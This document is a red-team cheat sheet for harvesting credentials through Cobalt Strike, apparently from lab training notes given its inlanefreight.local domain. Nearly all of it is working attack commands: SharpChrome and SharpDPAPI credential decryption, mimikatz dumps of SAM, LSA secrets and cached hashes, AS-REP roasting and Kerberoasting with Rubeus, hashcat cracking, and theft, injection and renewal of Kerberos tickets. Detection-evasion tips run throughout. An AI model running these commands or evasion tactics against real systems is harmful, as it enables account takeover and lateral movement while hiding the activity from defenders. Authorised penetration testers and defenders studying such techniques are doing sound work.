# Credential Harvesting (Cobalt Strike)

---

## Browser Credentials

SharpChrome can read and decrypt saved browser credentials.
Works from **medium-integrity** context.

```
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

---

## Windows Credential Manager

Stores credentials for RDP connections, etc.
Works from **medium-integrity** context.

```
# Enumerate saved credentials
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

# Decrypt via DC using DPAPI backup key
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

---

## OS Credential Dumping

> **OPSEC WARNING:** Avoid dumping credentials from LSASS. Security drivers use `ObRegisterCallbacks` to detect handles to LSASS.

### Logon Passwords (AVOID)

```
# DO NOT DO THIS - triggers detections
mimikatz sekurlsa::logonpasswords
```

Crack NTLM with hashcat mode 1000:
```bash
hashcat -a 0 -m 1000 ntlm.hash wordlist.txt -r rules/dive.rule
```

### Kerberos Encryption Keys (AVOID)

```
# DO NOT DO THIS - triggers detections
mimikatz sekurlsa::ekeys
```

**Note:** Mimikatz incorrectly labels hashes as `des_cbc_md4`. Check length:
- 64 chars = `aes256-cts-hmac-sha1-96`
- 32 chars = `aes128-cts-hmac-sha1-96` or `rc4_hmac`

Crack AES256 with hashcat mode 28900:
```bash
# Format: $krb5db$18$<username>$<DOMAIN-FQDN>$<hash>
hashcat -a 0 -m 28900 aes256.hash wordlist.txt -r rules/dive.rule
```

### SAM Database (SAFE)

Does **not** touch LSASS - safe to run.

```
# High integrity (not SYSTEM)
mimikatz !lsadump::sam

# SYSTEM context
mimikatz lsadump::sam
```

### LSA Secrets (SAFE)

Contains service account passwords, machine account password, EFS keys.

```
# High integrity (not SYSTEM)
mimikatz !lsadump::secrets

# SYSTEM context
mimikatz lsadump::secrets
```

### Cached Domain Credentials

MSCacheV2 hashes - slow to crack.

```
mimikatz lsadump::cache
```

---

## AS-REP Roasting

> **OPSEC WARNING:** Each AS-REP generates 4768 event. Don't roast the whole domain.

### Enumerate Vulnerable Users First

```
# Find users with pre-auth disabled
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes cn,samaccountname,serviceprincipalname
```

### Roast Specific User

```
# Target specific account only
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:oracle_svc /format:hashcat /nowrap
```

### Crack Hash

```bash
hashcat -a 0 -m 18200 asrep.hash wordlist.txt -r rules/dive.rule
```

---

## Kerberoasting

> **OPSEC WARNING:** Don't roast every SPN. Triage targets first.

### Enumerate SPNs First

```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
```

### Roast Specific SPN

```
# By SPN
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/ilf-sql-1.inlanefreight.local:1433 /simple /nowrap

# By username
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /format:hashcat /nowrap
```

### Crack Hash

```bash
hashcat -a 0 -m 13100 kerb.hash wordlist.txt -r rules/dive.rule
```

---

## Extracting Tickets from Memory

> **OPSEC SAFE:** Uses LSA APIs (`LsaCallAuthenticationPackage`), doesn't open handle to LSASS.

Requires **high-integrity** to dump other users' tickets.

### Triage Tickets

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```

Look for tickets with `krbtgt` service - these are TGTs.

### Dump Specific Ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x2842e6 /service:krbtgt /nowrap
```

### Impersonate User with Ticket

```
# Create sacrificial logon session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:tmorgan /domain:INLANEFREIGHT.LOCAL /password:FakePass

# Inject ticket into session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:<base64-ticket>

# Verify
run klist

# Drop impersonation
rev2self
```

---

## Renewing TGTs

TGTs can be renewed every 10 hours until RenewTill date.

### Check Ticket Validity

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:<base64-ticket>
```

### Renew Ticket

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:<base64-ticket> /nowrap
```
